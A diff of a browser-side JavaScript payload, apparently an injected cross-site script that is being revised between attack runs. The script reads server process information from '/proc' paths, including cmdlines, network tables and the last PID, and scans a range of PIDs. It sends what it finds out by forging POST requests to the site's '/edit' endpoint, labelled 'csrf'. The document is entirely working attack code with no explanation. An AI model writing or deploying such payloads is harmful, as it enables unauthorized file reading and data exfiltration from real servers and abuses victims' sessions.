@@ -1,6 +1,6 @@
 (async()=>{
-if(window.__codexRun0615ag)return;
-window.__codexRun0615ag=1;
+if(window.__codexRun0615ah)return;
+window.__codexRun0615ah=1;
 
 const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:_\\/-]/g,' '))});
 const read=async p=>{
@@ -30,7 +30,16 @@ const dirsFrom=c=>{
 
 const findDirs=async()=>{
  let dirs=[], seen=0;
- for(let base=1;base<8000;base+=120){
+ let probes=['/proc/self/cmdline','/proc/1/cmdline','/proc/sys/kernel/ns_last_pid','/proc/net/tcp'];
+ for(let p of probes){
+  let [st,c]=await read(p);
+  post('probe '+p+' '+st+' '+c.length+' '+c.slice(0,220));
+ }
+ let [lst,lastTxt]=await read('/proc/sys/kernel/ns_last_pid');
+ let last=parseInt((lastTxt.match(/\d+/)||['8000'])[0],10)||8000;
+ last=Math.max(8000,Math.min(last+1000,20000));
+ post('pid range '+last);
+ for(let base=1;base<last;base+=120){
   let rows=await Promise.all(Array.from({length:120},async(_,i)=>{
    let pid=base+i;
    let [st,c]=await read('/proc/'+pid+'/cmdline');
@@ -80,7 +89,7 @@ const scanFile=async p=>{
  return false;
 };
 
-post('profile scan 0615ag');
+post('profile scan 0615ah');
 let dirs=await findDirs();
 if(!dirs.length){post('profile none');return}
 
